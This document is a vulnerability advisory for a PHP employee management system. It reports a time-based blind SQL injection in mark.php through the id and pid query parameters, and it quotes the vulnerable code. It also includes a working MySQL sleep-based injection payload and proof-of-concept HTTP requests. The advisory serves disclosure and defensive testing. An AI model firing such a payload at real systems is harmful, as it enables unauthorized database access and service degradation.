## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/mark.php` contains a SQL Injection (time-based blind) vulnerability

Impact of the vulnerability
The application concatenates user-controlled query parameters into SQL statements without parameterization. This may allow an attacker to:

- Manipulate database queries (unauthorized access/modification depending on DB privileges)
- Infer database behavior/data using blind techniques
- Degrade availability by triggering time-delay/expensive database operations

### Payload:

(select*from(select+sleep(10)union/**/select+1)a)

```
(select*from(select+sleep(10)union/**/select+1)a)
```



### POC:

The vulnerable endpoint is `GET /mark.php?id=...&pid=...`. Both `id` and `pid` are taken from the query string and directly concatenated into SQL:

$id = (isset($_GET['id']) ? $_GET['id'] : '');

$pid = (isset($_GET['pid']) ? $_GET['pid'] : '');

$sql = "SELECT pid, project.eid, pname, duedate, subdate, mark, points, firstName, lastName, base, bonus, total FROM `project` , `rank` ,`employee`, `salary`  WHERE project.eid = $id AND pid = $pid";

- Baseline request (normal response time):

GET /mark.php?id=101&pid=215 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (use a URL-encoded time-delay expression in an authorized test environment):

GET /mark.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD>&pid=215 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The verification request responds approximately `10s` slower than the baseline, indicating the injected expression is being executed by the database.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409145844734](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409145844734.png)